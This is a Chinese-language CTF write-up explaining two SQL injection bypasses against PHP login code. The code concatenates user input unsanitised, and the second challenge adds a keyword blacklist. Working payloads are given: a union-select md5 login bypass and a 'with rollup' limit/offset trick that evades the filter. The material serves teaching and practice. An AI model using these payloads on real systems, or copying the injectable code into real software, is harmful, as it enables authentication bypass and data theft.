### SQL注入绕过

#### 例题1
```php
<?php
if($_POST[user] && $_POST[pass]) {
	//省略了mysql连接过程
    $user = $_POST[user];
    $pass = md5($_POST[pass]);

    $sql = "select pw from php where user='$user'";
    $query = mysql_query($sql);
    if (!$query) {
        printf("Error: %s\n", mysql_error($conn));
        exit();
    }
    $row = mysql_fetch_array($query, MYSQL_ASSOC);
    
    if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
        echo "<p>Logged in! Key:************** </p>";
    }
    else {
        echo("<p>Log in failure!</p>");
    }
}
?>
```
#### 分析
该文件接受user和pass两个参数，通过构造合适的sql语句进行SQL注入成功登录即可获得key。代码中没有过滤任何SQL语句，因此可以有多种方法进行payload的构造。

#### payload
```
user=' union select md5(1)#
pass=1 
```

#### 例题2
>题目地址:http://www.shiyanbar.com/ctf/1940
#### 代码
```php
<?php
error_reporting(0);
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
        $StrValue=implode($StrValue);
    }
    if (preg_match("/".$ArrReq."/is",$StrValue)==1){   
        print "水可载舟，亦可赛艇！";
        exit();
    }
}
//执行的开始部分
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";
foreach($_POST as $key=>$value){ 
    AttackFilter($key,$value,$filter);
}

//连接语句省略
$sql="SELECT * FROM interest WHERE uname = '{$_POST['uname']}'";
$query = mysql_query($sql); 
if (mysql_num_rows($query) == 1) { 
    $key = mysql_fetch_array($query);
    if($key['pwd'] == $_POST['pwd']) {
        print "CTF{XXXXXX}";
    }else{
        print "亦可赛艇！";
    }
}else{
	print "一颗赛艇！";
}
mysql_close($con);
?>
```
#### 分析
该PHP文件接收两个参数，uname和pwd。文件中包含了对一些SQL关键字和操作符的过滤，没有限制limit,with,rollup,offset等关键字。

根据代码中的条件，只有查询结果中只有1行，且输入密码必须和查询的密码对应才可以得到flag。

这里可以借助with rollup操作来实现SQL注入，该关键字可以将行中每一列的结果进行汇总，如果是数字，得到数字的和；如果是非数字字符串，得到0；

#### payload
```html
uname=1' or 1=1 group by pwd with rollup limit 1 offset 2#
pwd=
<!--pwd为空，uname的最终显示起始行是试出来的-->
<!--payload解释:得到所有用户名和密码，将密码汇总，选出null对应的行-->
```

#### 参考文章
with rollup
>https://www.cnblogs.com/phpper/p/9384614.html

limit宇offset
>https://blog.csdn.net/l1212xiao/article/details/80520330